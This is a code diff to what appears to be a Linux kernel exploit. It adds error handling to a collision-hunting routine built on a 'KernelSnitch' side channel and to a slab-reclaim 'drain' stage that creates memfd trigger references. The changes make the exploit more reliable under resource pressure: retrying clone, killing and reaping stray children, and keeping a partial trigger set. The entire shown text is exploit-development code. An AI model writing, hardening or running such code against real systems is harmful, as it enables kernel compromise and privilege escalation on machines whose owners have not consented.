@@ -588,13 +588,27 @@ uintptr_t match_page(kernelsnitch::KernelSnitchContext *ks, uintptr_t base, size
  * illegal transition. The child is always reaped -- leaking one per attempt
  * exhausts the process table and every later clone fails with EAGAIN. */
 bool find_collisions_for(kernelsnitch::KernelSnitchContext *ctx) {
-    const pid_t child = static_cast<pid_t>(SYSCHK(syscall(SYS_clone, SIGCHLD, nullptr, nullptr, nullptr, 0)));
+    pid_t child = 0;
+    do {
+        child = static_cast<pid_t>(syscall(SYS_clone, SIGCHLD, nullptr, nullptr, nullptr, 0));
+    } while (child < 0 && errno == EINTR);
     if (child == 0) {
         kernelsnitch::context_find_collisions(ctx);
         _exit(kernelsnitch::context_has_collisions(ctx) ? 0 : 4);
     }
+    /* Under process-table pressure clone fails with EAGAIN. SYSCHK is
+     * log-and-continue, so the -1 has to be caught here: waitpid(-1, ...)
+     * would reap an unrelated child and desynchronise the hunt. Resource
+     * pressure must degrade the attempt, not corrupt the run. */
+    if (child < 0) {
+        return false;
+    }
     int status = 0;
     const bool reaped = waitpid(child, &status, 0) == child;
+    if (!reaped) {
+        kill(child, SIGKILL);
+        waitpid(child, nullptr, 0);
+    }
     return reaped && WIFEXITED(status) && !WEXITSTATUS(status) && kernelsnitch::context_has_collisions(ctx);
 }
 
@@ -761,7 +775,14 @@ void a53_drain_group(A53ReclaimGroup *group) noexcept {
     /* Drain pressure: these extra references keep the reclaim from resolving
      * while the target references are released in order. */
     for (size_t i = 0; i < trigger_refs; i++) {
-        triggers.push_back(clone_memfd());
+        const int32_t fd = clone_memfd();
+        if (fd < 0) {
+            /* Under pressure we cannot build the full trigger set; keep what
+             * we have rather than closing -1 for the rest. */
+            pr_warning("A53_TRIGGER_SHORT want=%zu got=%zu\n", trigger_refs, i);
+            break;
+        }
+        triggers.push_back(fd);
     }
     pr_info("A53_TRIGGER_READY slabs=%lu refs=%zu\n",
             static_cast<unsigned long>(kernel::A53_TRIGGER_SLABS), trigger_refs);
